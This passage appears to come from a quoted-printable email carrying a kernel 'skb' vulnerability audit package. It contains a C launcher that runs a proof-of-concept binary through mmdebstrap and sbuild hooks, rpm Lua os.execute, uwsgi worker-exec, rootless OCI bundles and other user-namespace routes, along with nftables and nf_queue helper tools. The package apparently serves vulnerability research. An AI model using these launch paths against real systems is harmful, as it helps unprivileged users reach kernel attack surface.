        snprintf(hook, sizeof(hook),
                 "--setup-hook=3DSKB_POC_LAUNCHER=3Dmmdebstrap /usr/bin/u=
nshare "
                 "--user --map-user=3D1000 --map-group=3D1000 %s %s", poc=
, stage) >=3D (int)sizeof(hook))
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--mode=3Dunshare=
", "--variant=3Dcustom",
                         "--skip=3Dupdate", "--format=3Dtar", hook, (char=
 *)suite, tar,
                         "http://archive.ubuntu.com/ubuntu", NULL };
        rc =3D spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_lxc_usernsexec(const struct launcher_backend *backend,
                              const char *self, const char *stage)
{
    char dir[] =3D "/tmp/skb-poc-lxc.XXXXXX", poc[PATH_MAX];
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || chmod(dir, 0755) < 0 || make_poc(dir, self, poc)=
 < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--", "/usr/bin/u=
nshare", "--user",
                         "--map-user=3D1000", "--map-group=3D1000", poc, =
(char *)stage, NULL };
        rc =3D spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_sbuild(const struct launcher_backend *backend, const char =
*self,
                      const char *stage, const char *suite)
{
    static const char control[] =3D
        "Source: skb-launcher\nSection: misc\nPriority: optional\n"
        "Maintainer: Reviewer <reviewer@invalid>\nBuild-Depends: debhelpe=
r-compat (=3D 13)\n"
        "Standards-Version: 4.7.0\n\nPackage: skb-launcher\nArchitecture:=
 any\n"
        "Description: bounded launcher fixture\n";
    static const char changelog[] =3D
        "skb-launcher (1.0) unstable; urgency=3Dmedium\n\n  * Bounded lau=
ncher fixture.\n\n"
        " -- Reviewer <reviewer@invalid>  Thu, 01 Jan 2026 00:00:00 +0000=
\n";
    const char *home =3D getenv("HOME");
    char dir[] =3D "/tmp/skb-poc-sbuild.XXXXXX", poc[PATH_MAX], cache[PAT=
H_MAX] =3D {0};
    char package[PATH_MAX], debian[PATH_MAX], source[PATH_MAX], path[PATH=
_MAX];
    char dsc[PATH_MAX], hook[PATH_MAX];
    int rc =3D LAUNCHER_ERROR;

    if (!home || !suite || !mkdtemp(dir) ||
        snprintf(cache, sizeof(cache), "%s/.cache/sbuild/%s-amd64.tar", h=
ome, suite) >=3D (int)sizeof(cache) ||
        access(cache, R_OK) < 0) {
        if (cache[0])
            fprintf(stderr, "LAUNCHER_PRECONDITION_FAIL name=3Dsbuild req=
uired=3D%s\n", cache);
        goto out;
    }
    if (snprintf(package, sizeof(package), "%s/skb-launcher-1.0", dir) >=
=3D (int)sizeof(package) ||
        snprintf(debian, sizeof(debian), "%s/debian", package) >=3D (int)=
sizeof(debian) ||
        snprintf(source, sizeof(source), "%s/source", debian) >=3D (int)s=
izeof(source) ||
        mkdir(package, 0755) < 0 || mkdir(debian, 0755) < 0 || mkdir(sour=
ce, 0755) < 0 ||
        make_poc(dir, self, poc) < 0)
        goto out;
#define WRITE_DEBIAN(name, text, mode) \
    (snprintf(path, sizeof(path), "%s/%s", debian, name) >=3D (int)sizeof=
(path) || \
     write_file(path, text, mode) < 0)
    if (WRITE_DEBIAN("control", control, 0444) ||
        WRITE_DEBIAN("changelog", changelog, 0444) ||
        WRITE_DEBIAN("rules", "#!/usr/bin/make -f\n%:\n\tdh $@\n", 0555) =
||
        snprintf(path, sizeof(path), "%s/format", source) >=3D (int)sizeo=
f(path) ||
        write_file(path, "3.0 (native)\n", 0444) < 0)
        goto out;
#undef WRITE_DEBIAN
    {
        char *dpkg[] =3D { "/usr/bin/dpkg-source", "-b", package, NULL };
        if (spawn(dpkg, dir, NULL) !=3D 0)
            goto out;
    }
    if (snprintf(dsc, sizeof(dsc), "%s/skb-launcher_1.0.dsc", dir) >=3D (=
int)sizeof(dsc) ||
        snprintf(hook, sizeof(hook), "--pre-build-commands=3DSKB_POC_LAUN=
CHER=3Dsbuild %s %s",
                 poc, stage) >=3D (int)sizeof(hook))
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--chroot-mode=3D=
unshare", "--dist",
                         (char *)suite, "--chroot", cache, "--no-run-lint=
ian",
                         "--no-run-autopkgtest", "--log-external-command-=
output", hook,
                         dsc, NULL };
        rc =3D spawn(argv, dir, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_rpm(const struct launcher_backend *backend, const char *se=
lf,
                   const char *stage)
{
    char dir[] =3D "/tmp/skb-poc-rpm.XXXXXX", poc[PATH_MAX], status[PATH_=
MAX], expr[PATH_MAX];
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(status, sizeof(status), "%s/status", dir) >=3D (int)size=
of(status) ||
        snprintf(expr, sizeof(expr),
                 "%%{lua:local a,b,c=3Dos.execute(\"SKB_POC_LAUNCHER=3Drp=
m %s %s\"); "
                 "local f=3Dassert(io.open(\"%s\",\"w\")); "
                 "f:write(tostring((a=3D=3Dtrue and 0) or c or a),\"\\n\"=
); f:close()}",
                 poc, stage, status) >=3D (int)sizeof(expr))
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--eval", expr, N=
ULL };
        (void)spawn(argv, NULL, backend);
        rc =3D read_status_file(status);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_uwsgi(const struct launcher_backend *backend, const char *=
self,
                     const char *stage)
{
    char dir[] =3D "/tmp/skb-poc-uwsgi.XXXXXX", poc[PATH_MAX], status[PAT=
H_MAX];
    char socket_path[PATH_MAX], worker[PATH_MAX], script[PATH_MAX * 2];
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(status, sizeof(status), "%s/status", dir) >=3D (int)size=
of(status) ||
        snprintf(socket_path, sizeof(socket_path), "%s/socket", dir) >=3D=
 (int)sizeof(socket_path) ||
        snprintf(worker, sizeof(worker), "%s/worker", dir) >=3D (int)size=
of(worker) ||
        snprintf(script, sizeof(script),
                 "#!/bin/sh\nSKB_POC_LAUNCHER=3Duwsgi-core %s %s\nr=3D$?\=
n"
                 "printf '%%s\\n' \"$r\" > %s\nkill -TERM $PPID\nexit $r\=
n",
                 poc, stage, status) >=3D (int)sizeof(script) ||
        write_file(worker, script, 0555) < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--master", "--wo=
rkers", "1",
                         "--die-on-term", "--vacuum", "--socket", socket_=
path,
                         "--worker-exec", worker, NULL };
        (void)spawn(argv, NULL, backend);
        rc =3D read_status_file(status);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int find_subid(const char *path, const char *user,
                      unsigned int *start, unsigned int *count)
{
    char line[512], name[256];
    FILE *stream =3D fopen(path, "re");

    if (!stream)
        return -1;
    while (fgets(line, sizeof(line), stream)) {
        if (sscanf(line, "%255[^:]:%u:%u", name, start, count) =3D=3D 3 &=
&
            strcmp(name, user) =3D=3D 0) {
            fclose(stream);
            return 0;
        }
    }
    fclose(stream);
    return -1;
}

static int current_username(char user[256])
{
    char line[512], name[256];
    unsigned int uid;
    FILE *stream =3D fopen("/etc/passwd", "re");

    if (!stream)
        return -1;
    while (fgets(line, sizeof(line), stream)) {
        if (sscanf(line, "%255[^:]:%*[^:]:%u:", name, &uid) =3D=3D 2 && u=
id =3D=3D getuid()) {
            snprintf(user, 256, "%s", name);
            fclose(stream);
            return 0;
        }
    }
    fclose(stream);
    return -1;
}

static int run_oci(const struct launcher_backend *backend, const char *se=
lf,
                   const char *stage)
{
    static const char *dirs[] =3D { "usr", "tmp", "proc", "dev" };
    static const struct { const char *name, *target; } links[] =3D {
        { "bin", "usr/bin" }, { "sbin", "usr/sbin" },
        { "lib", "usr/lib" }, { "lib64", "usr/lib64" },
    };
    char user[256], dir[] =3D "/tmp/skb-poc-oci.XXXXXX";
    char bundle[PATH_MAX], rootfs[PATH_MAX], state[PATH_MAX], config[PATH=
_MAX];
    char poc[PATH_MAX], id[64], json[16384];
    unsigned int uid_start, uid_count, gid_start, gid_count;
    size_t i;
    int rc =3D LAUNCHER_ERROR;

    if (current_username(user) < 0 ||
        find_subid("/etc/subuid", user, &uid_start, &uid_count) < 0 ||
        find_subid("/etc/subgid", user, &gid_start, &gid_count) < 0 ||
        uid_count < 1000 || gid_count < 1000 || !mkdtemp(dir))
        return rc;
    if (snprintf(bundle, sizeof(bundle), "%s/bundle", dir) >=3D (int)size=
of(bundle) ||
        snprintf(rootfs, sizeof(rootfs), "%s/rootfs", bundle) >=3D (int)s=
izeof(rootfs) ||
        snprintf(state, sizeof(state), "%s/state", dir) >=3D (int)sizeof(=
state) ||
        snprintf(config, sizeof(config), "%s/config.json", bundle) >=3D (=
int)sizeof(config) ||
        mkdir(bundle, 0755) < 0 || mkdir(rootfs, 0755) < 0 || mkdir(state=
, 0755) < 0)
        goto out;
    for (i =3D 0; i < sizeof(dirs) / sizeof(dirs[0]); i++)
        if (mkdir_join(rootfs, dirs[i]) < 0)
            goto out;
    for (i =3D 0; i < sizeof(links) / sizeof(links[0]); i++)
        if (link_join(rootfs, links[i].name, links[i].target) < 0)
            goto out;
    if (make_poc(rootfs, self, poc) < 0 ||
        snprintf(id, sizeof(id), "skb-poc-%s-%ld", backend->name, (long)g=
etpid()) >=3D (int)sizeof(id) ||
        snprintf(json, sizeof(json),
            "{\"ociVersion\":\"1.2.0\",\"process\":{\"terminal\":false,"
            "\"user\":{\"uid\":1000,\"gid\":1000},\"args\":[\"/poc\",\"%s=
\"],"
            "\"env\":[\"PATH=3D/usr/sbin:/usr/bin:/sbin:/bin\",\"SKB_POC_=
LAUNCHER=3D%s\"],"
            "\"cwd\":\"/\",\"noNewPrivileges\":false,\"capabilities\":{\"=
bounding\":[],"
            "\"permitted\":[],\"effective\":[],\"ambient\":[]}},"
            "\"root\":{\"path\":\"rootfs\",\"readonly\":false},\"mounts\"=
:["
            "{\"destination\":\"/proc\",\"type\":\"proc\",\"source\":\"pr=
oc\"},"
            "{\"destination\":\"/dev\",\"type\":\"tmpfs\",\"source\":\"tm=
pfs\","
            "\"options\":[\"nosuid\",\"strictatime\",\"mode=3D755\",\"siz=
e=3D65536k\"]},"
            "{\"destination\":\"/usr\",\"type\":\"bind\",\"source\":\"/us=
r\","
            "\"options\":[\"rbind\",\"ro\"]},{\"destination\":\"/tmp\","
            "\"type\":\"bind\",\"source\":\"/tmp\",\"options\":[\"rbind\"=
,\"rw\"]}],"
            "\"linux\":{\"namespaces\":[{\"type\":\"mount\"},{\"type\":\"=
uts\"},"
            "{\"type\":\"ipc\"},{\"type\":\"pid\"},{\"type\":\"network\"}=
,"
            "{\"type\":\"user\"}],\"uidMappings\":[{\"containerID\":0,\"h=
ostID\":1000,"
            "\"size\":1},{\"containerID\":1,\"hostID\":%u,\"size\":%u}],"
            "\"gidMappings\":[{\"containerID\":0,\"hostID\":1000,\"size\"=
:1},"
            "{\"containerID\":1,\"hostID\":%u,\"size\":%u}],\"maskedPaths=
\":[],"
            "\"readonlyPaths\":[]}}\n",
            stage, backend->name, uid_start, uid_count, gid_start, gid_co=
unt) >=3D (int)sizeof(json) ||
        write_file(config, json, 0444) < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--root", state, =
"--rootless=3Dtrue",
                         "run", "--bundle", bundle, id, NULL };
        rc =3D spawn(argv, NULL, NULL);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_vpnns(const struct launcher_backend *backend, const char *=
self,
                     const char *stage)
{
    const char *home =3D getenv("HOME");
    char dir[PATH_MAX], *base, name[64];
    int rc =3D LAUNCHER_ERROR;

    if (!home || snprintf(dir, sizeof(dir), "%s/.vpnns-skb-poc.XXXXXX", h=
ome) >=3D (int)sizeof(dir) ||
        !mkdtemp(dir))
        return rc;
    base =3D strrchr(dir, '/');
    if (!base || strncmp(base + 1, ".vpnns-", 7) !=3D 0 ||
        snprintf(name, sizeof(name), "%s", base + 8) >=3D (int)sizeof(nam=
e) || rmdir(dir) < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--name", name, "=
--",
                         "/usr/bin/unshare", "--user", "--map-user=3D1000=
",
                         "--map-group=3D1000", (char *)self, (char *)stag=
e, NULL };
        rc =3D spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

const struct launcher_backend *launcher_find(const char *name)
{
    static const struct { const char *alias, *canonical; } aliases[] =3D =
{
        { "charliecloud", "ch-run" }, { "lxc", "lxc-usernsexec" },
        { "ocproxy", "vpnns" }, { "bazel-bootstrap", "bazel" },
        { "libcamera-tools", "libcamerify" },
    };
    size_t i;

    if (!name)
        return NULL;
    for (i =3D 0; i < sizeof(aliases) / sizeof(aliases[0]); i++)
        if (strcmp(name, aliases[i].alias) =3D=3D 0) {
            name =3D aliases[i].canonical;
            break;
        }
    for (i =3D 0; i < LAUNCHER_COUNT; i++)
        if (strcmp(name, launcher_backends[i].name) =3D=3D 0)
            return &launcher_backends[i];
    return NULL;
}

int launcher_installed(const struct launcher_backend *backend)
{
    return backend && access(backend->executable, X_OK) =3D=3D 0;
}

int launcher_run(const struct launcher_backend *backend, const char *self=
,
                 const char *stage, const char *suite)
{
    if (!launcher_installed(backend) || !self || !stage)
        return LAUNCHER_NOT_FOUND;
    switch (backend->kind) {
    case 0: case 1: {
        char *argv[] =3D { (char *)backend->executable, "unshare", "/usr/=
bin/unshare",
                         "--user", "--map-user=3D1000", "--map-group=3D10=
00",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 2: {
        char *argv[] =3D { (char *)backend->executable, "/usr/bin/unshare=
", "--user",
                         "--map-user=3D1000", "--map-group=3D1000",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 3: {
        char *argv[] =3D { (char *)backend->executable, "exec", "--",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 4: return run_tup(backend, self, stage);
    case 5: return run_charliecloud(backend, self, stage);
    case 6: return run_mmdebstrap(backend, self, stage, suite);
    case 7: return run_lxc_usernsexec(backend, self, stage);
    case 8: {
        char *argv[] =3D { (char *)backend->executable, "-s", "no", "/usr=
/bin/unshare",
                         "--user", "--map-user=3D1000", "--map-group=3D10=
00",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 9: return run_vpnns(backend, self, stage);
    case 10: {
        char *argv[] =3D { (char *)backend->executable, "-n", "-s", "--",
                         "/usr/bin/unshare", "--user", "--map-user=3D1000=
",
                         "--map-group=3D1000", (char *)self, (char *)stag=
e, NULL };
        return spawn(argv, NULL, backend);
    }
    case 11: return run_rpm(backend, self, stage);
    case 12: return run_bazel(backend, self, stage);
    case 13: return run_uwsgi(backend, self, stage);
    case 14: {
        char *argv[] =3D { (char *)backend->executable, "/usr/bin/env", "=
-u", "LD_PRELOAD",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 15: case 16: return run_oci(backend, self, stage);
    case 17: return run_sbuild(backend, self, stage, suite);
    default: return LAUNCHER_ERROR;
    }
}

~~~

### nft-localout-queue.c

~~~c
// SPDX-License-Identifier: GPL-2.0
/* Audit-only: install an IPv4 LOCAL_OUT nftables base chain that queues =
all
 * packets to NFQUEUE 0.  Intended only for the isolated skb audit guest.
 */
#include <arpa/inet.h>
#include <errno.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSZ 16384

static unsigned int seq;

static struct nlmsghdr *nft_hdr(void *buf, uint16_t type, uint8_t family,
=09=09=09=09unsigned int flags)
{
=09struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
=09struct nfgenmsg *nfg;

=09nlh->nlmsg_type =3D (NFNL_SUBSYS_NFTABLES << 8) | type;
=09nlh->nlmsg_flags =3D NLM_F_REQUEST | flags;
=09nlh->nlmsg_seq =3D ++seq;
=09nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
=09nfg->nfgen_family =3D family;
=09nfg->version =3D NFNETLINK_V0;
=09nfg->res_id =3D 0;
=09return nlh;
}

static void batch_marker(struct mnl_nlmsg_batch *batch, uint16_t type)
{
=09struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(mnl_nlmsg_batch_current(=
batch));
=09struct nfgenmsg *nfg;

=09nlh->nlmsg_type =3D type;
=09nlh->nlmsg_flags =3D NLM_F_REQUEST;
=09nlh->nlmsg_seq =3D ++seq;
=09nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
=09nfg->nfgen_family =3D AF_UNSPEC;
=09nfg->version =3D NFNETLINK_V0;
=09nfg->res_id =3D htons(NFNL_SUBSYS_NFTABLES);
=09mnl_nlmsg_batch_next(batch);
}

int main(void)
{
=09char buf[BUFSZ], rbuf[BUFSZ];
=09struct mnl_nlmsg_batch *batch;
=09struct mnl_socket *nl;
=09struct nlattr *list, *elem, *data, *hook;
=09struct nlmsghdr *nlh;
=09unsigned int portid;
=09int ret, acks =3D 0;

=09nl =3D mnl_socket_open(NETLINK_NETFILTER);
=09if (!nl) {
=09=09perror("mnl_socket_open");
=09=09return 1;
=09}
=09if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
=09=09perror("mnl_socket_bind");
=09=09return 1;
=09}
=09portid =3D mnl_socket_get_portid(nl);
=09batch =3D mnl_nlmsg_batch_start(buf, sizeof(buf));
=09batch_marker(batch, NFNL_MSG_BATCH_BEGIN);

=09nlh =3D nft_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE,
=09=09      NFPROTO_IPV4, NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
=09mnl_attr_put_strz(nlh, NFTA_TABLE_NAME, "skbaudit");
=09mnl_nlmsg_batch_next(batch);

=09nlh =3D nft_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN,
=09=09      NFPROTO_IPV4, NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
=09mnl_attr_put_strz(nlh, NFTA_CHAIN_TABLE, "skbaudit");
=09mnl_attr_put_strz(nlh, NFTA_CHAIN_NAME, "outq");
=09mnl_attr_put_strz(nlh, NFTA_CHAIN_TYPE, "filter");
=09hook =3D mnl_attr_nest_start(nlh, NFTA_CHAIN_HOOK);
=09mnl_attr_put_u32(nlh, NFTA_HOOK_HOOKNUM, htonl(NF_INET_LOCAL_OUT));
=09mnl_attr_put_u32(nlh, NFTA_HOOK_PRIORITY, htonl(0));
=09mnl_attr_nest_end(nlh, hook);
=09mnl_nlmsg_batch_next(batch);

=09nlh =3D nft_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE,
=09=09      NFPROTO_IPV4, NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK);
=09mnl_attr_put_strz(nlh, NFTA_RULE_TABLE, "skbaudit");
=09mnl_attr_put_strz(nlh, NFTA_RULE_CHAIN, "outq");
=09list =3D mnl_attr_nest_start(nlh, NFTA_RULE_EXPRESSIONS);
=09elem =3D mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
=09mnl_attr_put_strz(nlh, NFTA_EXPR_NAME, "queue");
=09data =3D mnl_attr_nest_start(nlh, NFTA_EXPR_DATA);
=09mnl_attr_put_u16(nlh, NFTA_QUEUE_NUM, htons(0));
=09mnl_attr_nest_end(nlh, data);
=09mnl_attr_nest_end(nlh, elem);
=09mnl_attr_nest_end(nlh, list);
=09mnl_nlmsg_batch_next(batch);

=09batch_marker(batch, NFNL_MSG_BATCH_END);
=09ret =3D mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
=09=09=09=09mnl_nlmsg_batch_size(batch));
=09mnl_nlmsg_batch_stop(batch);
=09if (ret < 0) {
=09=09perror("mnl_socket_sendto");
=09=09return 1;
=09}

=09while (acks < 3 && (ret =3D mnl_socket_recvfrom(nl, rbuf, sizeof(rbuf)=
)) > 0) {
=09=09ret =3D mnl_cb_run(rbuf, ret, 0, portid, NULL, NULL);
=09=09if (ret < 0) {
=09=09=09perror("nft batch acknowledgement");
=09=09=09return 1;
=09=09}
=09=09acks++;
=09}
=09if (acks < 3) {
=09=09fprintf(stderr, "received only %d nft acknowledgements: %s\n",
=09=09=09acks, strerror(errno));
=09=09return 1;
=09}
=09printf("NFT_QUEUE_SETUP table=3Dskbaudit chain=3Doutq hook=3DLOCAL_OUT=
 queue=3D0 acks=3D%d\n",
=09       acks);
=09mnl_socket_close(nl);
=09return 0;
}

~~~

### nf_queue.c

~~~c
// SPDX-License-Identifier: GPL-2.0

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>

#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_queue.h>

struct options {
=09bool count_packets;
=09bool gso_enabled;
=09bool failopen;
=09bool out_of_order;
=09bool bogus_verdict;
=09int verbose;
=09unsigned int queue_num;
=09unsigned int timeout;
=09uint32_t verdict;
=09uint32_t delay_ms;
};

static unsigned int queue_stats[5];
static struct options opts;

static void help(const char *p)
{
=09printf("Usage: %s [-c|-v [-vv] ] [-o] [-O] [-b] [-t timeout] [-q queue=
_num] [-Qdst_queue ] [ -d ms_delay ] [-G]\n", p);
}

static int parse_attr_cb(const struct nlattr *attr, void *data)
{
=09const struct nlattr **tb =3D data;
=09int type =3D mnl_attr_get_type(attr);

=09/* skip unsupported attribute in user-space */
=09if (mnl_attr_type_valid(attr, NFQA_MAX) < 0)
=09=09return MNL_CB_OK;

=09switch (type) {
=09case NFQA_MARK:
=09case NFQA_IFINDEX_INDEV:
=09case NFQA_IFINDEX_OUTDEV:
=09case NFQA_IFINDEX_PHYSINDEV:
=09case NFQA_IFINDEX_PHYSOUTDEV:
=09=09if (mnl_attr_validate(attr, MNL_TYPE_U32) < 0) {
=09=09=09perror("mnl_attr_validate");
=09=09=09return MNL_CB_ERROR;
=09=09}
=09=09break;
=09case NFQA_TIMESTAMP:
=09=09if (mnl_attr_validate2(attr, MNL_TYPE_UNSPEC,
=09=09    sizeof(struct nfqnl_msg_packet_timestamp)) < 0) {
=09=09=09perror("mnl_attr_validate2");
=09=09=09return MNL_CB_ERROR;
=09=09}
=09=09break;
=09case NFQA_HWADDR:
=09=09if (mnl_attr_validate2(attr, MNL_TYPE_UNSPEC,
=09=09    sizeof(struct nfqnl_msg_packet_hw)) < 0) {
=09=09=09perror("mnl_attr_validate2");
=09=09=09return MNL_CB_ERROR;
=09=09}
=09=09break;
=09case NFQA_PAYLOAD:
=09=09break;
=09}
=09tb[type] =3D attr;
=09return MNL_CB_OK;
}

static int queue_cb(const struct nlmsghdr *nlh, void *data)
{
=09struct nlattr *tb[NFQA_MAX+1] =3D { 0 };
=09struct nfqnl_msg_packet_hdr *ph =3D NULL;
=09uint32_t id =3D 0;

=09(void)data;

=09mnl_attr_parse(nlh, sizeof(struct nfgenmsg), parse_attr_cb, tb);
=09if (tb[NFQA_PACKET_HDR]) {
=09=09ph =3D mnl_attr_get_payload(tb[NFQA_PACKET_HDR]);
=09=09id =3D ntohl(ph->packet_id);

=09=09if (opts.verbose > 0)
=09=09=09printf("packet hook=3D%u, hwproto 0x%x",
=09=09=09=09ntohs(ph->hw_protocol), ph->hook);

=09=09if (ph->hook >=3D 5) {
=09=09=09fprintf(stderr, "Unknown hook %d\n", ph->hook);
=09=09=09return MNL_CB_ERROR;
=09=09}

=09=09if (opts.verbose > 0) {
=09=09=09uint32_t skbinfo =3D 0;

=09=09=09if (tb[NFQA_SKB_INFO])
=09=09=09=09skbinfo =3D ntohl(mnl_attr_get_u32(tb[NFQA_SKB_INFO]));
=09=09=09if (skbinfo & NFQA_SKB_CSUMNOTREADY)
=09=09=09=09printf(" csumnotready");
=09=09=09if (skbinfo & NFQA_SKB_GSO)
=09=09=09=09printf(" gso");
=09=09=09if (skbinfo & NFQA_SKB_CSUM_NOTVERIFIED)
=09=09=09=09printf(" csumnotverified");
=09=09=09puts("");
=09=09}

=09=09if (opts.count_packets)
=09=09=09queue_stats[ph->hook]++;
=09}

=09return MNL_CB_OK + id;
}

static struct nlmsghdr *
nfq_build_cfg_request(char *buf, uint8_t command, int queue_num)
{
=09struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
=09struct nfqnl_msg_config_cmd cmd =3D {
=09=09.command =3D command,
=09=09.pf =3D htons(AF_INET),
=09};
=09struct nfgenmsg *nfg;

=09nlh->nlmsg_type=09=3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
=09nlh->nlmsg_flags =3D NLM_F_REQUEST;

=09nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));

=09nfg->nfgen_family =3D AF_UNSPEC;
=09nfg->version =3D NFNETLINK_V0;
=09nfg->res_id =3D htons(queue_num);

=09mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);

=09return nlh;
}

static struct nlmsghdr *
nfq_build_cfg_params(char *buf, uint8_t mode, int range, int queue_num)
{
=09struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
=09struct nfqnl_msg_config_params params =3D {
=09=09.copy_range =3D htonl(range),
=09=09.copy_mode =3D mode,
=09};
=09struct nfgenmsg *nfg;

=09nlh->nlmsg_type=09=3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
=09nlh->nlmsg_flags =3D NLM_F_REQUEST;

=09nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
=09nfg->nfgen_family =3D AF_UNSPEC;
=09nfg->version =3D NFNETLINK_V0;
=09nfg->res_id =3D htons(queue_num);

=09mnl_attr_put(nlh, NFQA_CFG_PARAMS, sizeof(params), &params);

=09return nlh;
}

static struct nlmsghdr *
nfq_build_verdict(char *buf, int id, int queue_num, uint32_t verd)
{
=09struct nfqnl_msg_verdict_hdr vh =3D {
=09=09.verdict =3D htonl(verd),
=09=09.id =3D htonl(id),
=09};
=09struct nlmsghdr *nlh;
=09struct nfgenmsg *nfg;

=09nlh =3D mnl_nlmsg_put_header(buf);
=09nlh->nlmsg_type =3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_VERDICT;
=09nlh->nlmsg_flags =3D NLM_F_REQUEST;
=09nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
=09nfg->nfgen_family =3D AF_UNSPEC;
=09nfg->version =3D NFNETLINK_V0;
=09nfg->res_id =3D htons(queue_num);

=09mnl_attr_put(nlh, NFQA_VERDICT_HDR, sizeof(vh), &vh);

=09return nlh;
}

static void print_stats(void)
{
=09unsigned int last, total;
=09int i;

=09total =3D 0;
=09last =3D queue_stats[0];

=09for (i =3D 0; i < 5; i++) {
=09=09printf("hook %d packets %08u\n", i, queue_stats[i]);
=09=09last =3D queue_stats[i];
=09=09total +=3D last;
=09}

=09printf("%u packets total\n", total);
}

struct mnl_socket *open_queue(void)
{
=09char buf[MNL_SOCKET_BUFFER_SIZE];
=09unsigned int queue_num;
=09struct mnl_socket *nl;
=09struct nlmsghdr *nlh;
=09struct timeval tv;
=09uint32_t flags;

=09nl =3D mnl_socket_open(NETLINK_NETFILTER);
=09if (nl =3D=3D NULL) {
=09=09perror("mnl_socket_open");
=09=09exit(EXIT_FAILURE);
=09}

=09if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
=09=09perror("mnl_socket_bind");
=09=09exit(EXIT_FAILURE);
=09}

=09queue_num =3D opts.queue_num;
=09nlh =3D nfq_build_cfg_request(buf, NFQNL_CFG_CMD_BIND, queue_num);

=09if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
=09=09perror("mnl_socket_sendto");
=09=09exit(EXIT_FAILURE);
=09}

=09nlh =3D nfq_build_cfg_params(buf, NFQNL_COPY_PACKET, 0xFFFF, queue_num=
);

=09flags =3D opts.gso_enabled ? NFQA_CFG_F_GSO : 0;
=09flags |=3D NFQA_CFG_F_UID_GID;
=09if (opts.failopen)
=09=09flags |=3D NFQA_CFG_F_FAIL_OPEN;
=09mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(flags));
=09mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(flags));

=09if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
=09=09perror("mnl_socket_sendto");
=09=09exit(EXIT_FAILURE);
=09}

=09memset(&tv, 0, sizeof(tv));
=09tv.tv_sec =3D opts.timeout;
=09if (opts.timeout && setsockopt(mnl_socket_get_fd(nl),
=09=09=09=09       SOL_SOCKET, SO_RCVTIMEO,
=09=09=09=09       &tv, sizeof(tv))) {
=09=09perror("setsockopt(SO_RCVTIMEO)");
=09=09exit(EXIT_FAILURE);
=09}

=09return nl;
}

static void sleep_ms(uint32_t delay)
{
=09struct timespec ts =3D { .tv_sec =3D delay / 1000 };

=09delay %=3D 1000;

=09ts.tv_nsec =3D delay * 1000llu * 1000llu;

=09nanosleep(&ts, NULL);
}

static int mainloop(void)
{
=09unsigned int buflen =3D 64 * 1024 + MNL_SOCKET_BUFFER_SIZE;
=09struct mnl_socket *nl;
=09struct nlmsghdr *nlh;
=09uint32_t ooo_ids[16];
=09unsigned int portid;
=09int ooo_count =3D 0;
=09char *buf;
=09int ret;

=09buf =3D malloc(buflen);
=09if (!buf) {
=09=09perror("malloc");
